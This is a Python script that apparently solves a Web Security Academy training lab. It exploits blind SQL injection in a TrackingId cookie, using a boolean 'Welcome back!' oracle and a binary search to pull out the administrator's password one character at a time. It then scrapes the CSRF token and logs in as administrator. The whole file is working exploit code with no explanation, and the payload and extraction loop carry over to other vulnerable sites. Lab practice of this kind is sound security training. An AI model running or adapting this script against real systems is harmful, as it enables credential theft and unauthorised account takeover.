import requests
from lxml import html

URL = "https://0abe00cd03b2a50d80663f2c002b00b1.web-security-academy.net/"
session = requests.Session()

cookie = {
    "TrackingId": ""
}

payload = "' OR {}>=ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),{},1))-- -"

# Find password length

password_len = -1

for i in range(1, 1000):
    cookie["TrackingId"] = payload.format(0, i)
    response = session.get(URL + "login", cookies=cookie).text
    if "Welcome back!" not in response:
        continue
    password_len = i - 1
    break

# Extract password

username = "administrator"
password = ""

for i in range(1, password_len + 1):
    l = 32
    r = 127
    
    while l < r:
        mid = (l + r) >> 1
        
        cookie["TrackingId"] = payload.format(mid, i)
        response = session.get(URL + "login", cookies=cookie).text
        
        if "Welcome back!" in response:
            r = mid
        else:
            l = mid + 1
            
    password += chr(l)

# Login

response = session.get(URL + "login").text
parser = html.fromstring(response)
csrf_token = parser.xpath("//input[@name='csrf']/@value")

PAYLOAD_2 = {
    "csrf": csrf_token,
    "username": username,
    "password": password
}

session.post(URL + "login", data=PAYLOAD_2)